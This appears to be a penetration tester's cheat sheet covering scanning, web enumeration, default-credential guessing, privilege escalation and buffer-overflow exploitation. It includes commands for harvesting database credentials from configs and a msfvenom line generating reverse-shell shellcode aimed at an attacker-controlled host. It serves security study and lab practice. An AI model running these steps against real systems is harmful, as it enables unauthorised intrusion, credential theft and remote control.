# Philosophy
- first, test the potential vuln (or each step of it) by minimum cost

# Init contact
- nmap -sC -sV -oA \<name\> \<ip\>
- nmap -p- -sV \<ip\> > all-tcp
- nmap -sU \<ip\> > comm-udp
- nmap --script vuln \<ip\>

# http/https 80/443
- gobuster -u http://xxxxx -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html
  - remember to recursively scan if needed
- google its software version and find its exploit
- login page => google its default cred
- play around and see whether there is any upload/execute vuln
- check its ssl cert information, it may contain some username or email
- play with PHPSESSID, reuse it, to see what happens

# snmp udp/161
- snmpwalk -c public -v1 <target>
- snmp-check -w -t 30 <target>

# priv esc
- go to /var/www/, read config => get db cred => extract juicy info
- password reuse
- find SUID files => find / -perm -4000 2>/dev/null
- find all files in /home => find /home -type f

# manually test user pass
- admin:admin
- admin:password
- admin:Password1
- guest:guest

# file 
- exitfool xx => find hidden info, like author, email

# File Transfer
- smb share
  - (kali) impacket-smbserver share \<shared path\>
  - (windows) net use z: \\\\<kali's ip\>\share
  - (windows) copy \<file\> z:

# gdb
- r < <(python exp.py)
  - (or 'set args' if take parameters)
- r < input.txt
- readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
- strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep '/bin/sh'
- p system => address of function system
- info functions => list all functions
- vmmap => find which part is executable.

# binary exploit steps (with immunity dbg)
1. find EIP overflow offset
    1. `msf-pattern_create -l 300`
    1. `msf-pattern_offset -q <value>`
1. test bad chars
1. !mona modules
    1. see modules and their security flags. we also need to make sure the module address doesn't contain bad chars.
1. click the "e" button to see the list of executable modules. Double click on one to view its assembly code.
1. find "jmp esp" commands
    1. right click -> search for -> command, then enter "jmp esp"(or others).
    1. right click -> search for -> sequence of commands, then enter "push esp", new line, "ret".
    1. if no DEP is enabled, we can search beyond the .text section where the "search for" commands focus. We can search other sections.
        1. `msf-nasm_shell` and enter "jmp esp", it says "FFE4"
        2. `!mona find -s "\xff\xe4" -m xxx.dll
        3. you can click the button "->|" (except the | are dots)
1. place shellcode
    1. `msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=<attacker port> -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai`
